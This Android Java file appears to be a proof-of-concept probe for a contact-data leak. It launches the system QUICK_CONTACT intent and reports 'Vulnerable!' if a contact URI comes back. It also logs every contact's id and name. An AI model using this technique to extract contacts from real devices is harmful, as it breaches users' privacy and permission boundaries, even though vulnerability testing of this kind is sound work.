package dev.virtualpatch.leakcontact;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Rect;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.util.Log;

public class MainActivity extends AppCompatActivity {

    private static String TAG = "CONTACTS";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        String id = getContactList();
        Intent i = new Intent();
        Uri contact = Uri.parse(ContactsContract.Contacts.CONTENT_URI + "/" + id);
        Log.v(TAG, "uri: "+contact.toString());
        i.setAction("android.provider.action.QUICK_CONTACT");
        i.setType("vnd.android.cursor.item/contact");
        i.setData(contact);
        i.setSourceBounds(new Rect());
        startActivityForResult(i, 1);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        if(data == null) {
            Log.d(TAG, "missing response intent, not vulnerable. result: " + resultCode);
        } else {
            Uri contact = data.getData();
            Log.d(TAG, "Vulnerable! uri: " + contact.toString());
        }
        super.onActivityResult(requestCode, resultCode, data);
    }

    private String getContact(String id) {
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                new String[]{ContactsContract.Contacts.DISPLAY_NAME}, ContactsContract.Contacts._ID+"=?", new String[]{id}, null);

        if (cur != null && cur.getCount() > 0) {
            String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
            cur.close();
            return name;
        }
        return null;
    }

    private String getContactList() {
        String id = null;
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));
                Log.d(TAG, "id: "+ id);
                Log.d(TAG, "name: "+ name);

            }
        }
        if(cur!=null){
            cur.close();
        }
        return id;
    }
}